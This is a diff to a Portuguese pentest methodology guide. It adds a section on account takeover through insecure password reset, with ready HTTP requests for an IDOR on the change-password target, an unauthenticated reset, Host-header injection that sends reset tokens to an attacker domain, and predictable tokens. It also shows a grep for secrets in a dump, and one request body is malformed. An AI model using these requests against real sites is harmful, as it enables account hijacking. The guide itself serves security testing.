@@ -325,7 +325,7 @@ Ferramentas:
 
 <br>
 
-Olhar sessão 4.8 para ataques de ATO.
+Olhar sessão 4.8 para vetores de ATO.
 
 <br>
 
@@ -520,6 +520,57 @@ Agora grep por segredos no que você baixou
 ```bash
 grep -rEi 'password|secret|api_key|DB_|mysql|--password=' ./dump
 ```
+<br>
+
+### **4.8 ATO - Reset de senha inseguro**
+ 
+`Vetor 1A: Alvo do reset controlável (o IDOR do reset).`
+*   Em uma área logada, a request de "alterar senha" carrega quem está tendo a senha trocada. Se esse campo vier do cliente e o servidor não fixar na sessão, troque-o:
+
+```bash
+POST /autenticacao/api/v1/alterar-senha HTTP/2
+Host: alvo.com
+Content-Type: application/json
+Cookie: session=<sua_sessao_ContaA>
+{"usuario":"vitima_contaB","novaSenha":"Senha123!","confirmaSenha":"Senha123!"}
+# <- "usuario" deveria ser fixo na sessão; se aceitar outro login, é ATO
+```
+
+<br>
+
+`Vetor 1B:  Reset que devolve a senha (ou não exige autenticação). `
+*   Pior cenário: o endpoint de reset responde com a nova senha no corpo, ou nem pede sessão:
+
+```bash
+POST /autenticacao/api/v1/resetar-senha HTTP/2
+Host: alvo.com
+Content-Type: application/json
+{"usuario":"vitima_contaB","novaSenha":"Nova@123","confirmarSenha":"Nova@123","resetarSenha"
+```
+
+```bash
+HTTP/2 200 OK
+Content-Type: application/json
+{"message":"Senha redefinida com sucesso"}   # <- algumas APIs até devolvem a senha aqui
+```
+
+<br>
+
+`Vetor 1C:  Host header injection no link de reset.`
+*   O servidor monta o link do e-mail usando o header Host da request. Se você controla o Host, o link aponta pro seu domínio, e quando a vítima clica, o token de reset vaza pro seu servidor via a própria URL:
+*   A vítima recebe um e-mail "legítimo" com https://atacante.com/reset?token=ABC.... Ao clicar, o token cai no seu log. Variante: header X-Forwarded-Host: atacante.com.
+
+```bash
+POST /esqueci-senha HTTP/2
+Host: atacante.com          # <- o app usa este Host pra montar o link do e-mail
+Content-Type: application/x-www-form-urlencoded
+email=vitima@exemplo.com
+```
+
+<br>
+
+`Vetor 1D:   Token de reset previsível ou eterno.`
+*    Verifique o token: é sequencial? Curto? Baseado em timestamp? Expira?Invalida após o uso? Um token que não expira pode ser reusado meses depois; um previsível pode ser adivinhado. Gere dois resets seguidos e compare os tokens: se houver padrão, é explorável
 
 ---
 <br>
